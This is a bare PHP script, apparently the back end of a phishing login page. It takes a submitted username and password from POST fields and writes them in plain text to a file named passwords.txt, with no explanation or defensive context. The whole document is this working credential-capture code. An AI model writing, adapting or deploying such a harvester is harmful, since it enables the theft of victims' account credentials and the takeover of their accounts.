<?php
$myfile = fopen("passwords.txt", "w") or die("Unable to open file!");
$txt = "username: " . $_POST['text'] . "\n";
$txt .= "password: " . $_POST['pass'] . " \n";;
fwrite($myfile, $txt);
fclose($myfile);
?>
